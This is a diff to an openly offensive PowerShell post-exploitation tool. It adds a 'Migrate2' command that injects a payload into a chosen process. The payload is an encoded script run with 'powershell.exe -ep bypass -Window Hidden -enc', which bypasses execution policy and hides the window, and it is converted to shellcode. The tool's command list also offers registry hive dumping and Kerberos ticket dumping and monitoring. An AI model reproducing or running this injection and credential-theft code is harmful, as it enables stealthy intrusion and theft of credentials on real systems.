@@ -2234,7 +2234,7 @@ function InteractWithPipeSession{
 			continue
 		}
 		
-		elseif ($command -like "Migrate *") {
+		elseif ($command -like "Migrate *" -OR $command -like "Migrate2 *") {
 			
 			$commandParts = $command -split '\s+', 2
 			$InjectPID = $commandParts[1]
@@ -2270,7 +2270,10 @@ function InteractWithPipeSession{
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
 			if($global:Detach){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
-			else{$finalstring = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"}
+			else{
+				if($command -like "Migrate *"){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
+				elseif($command -like "Migrate2 *"){$finalstring = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"}
+			}
 			
 			$ShCodePlaceholder = ShellGen -ShCommand $finalstring
 			
@@ -4193,6 +4196,7 @@ function Get-AvailableCommands  {
 	Write-Output " Hive               HiveDump"
 	Write-Output " Kerb               Kerb TGTs Dump"
 	Write-Output " Migrate <pid>      Inject payload into specified pid [New Session]"
+ 	Write-Output " Migrate2 <pid>     Different migration syntax [In case the above fails]"
 	Write-Output " Monitor            Monitor Cache for TGTs"
 	Write-Output " MonitorRead        Retrieve TGTs from Monitor activity"
 	Write-Output " MonitorClear       Clear TGTs from Monitor activity"
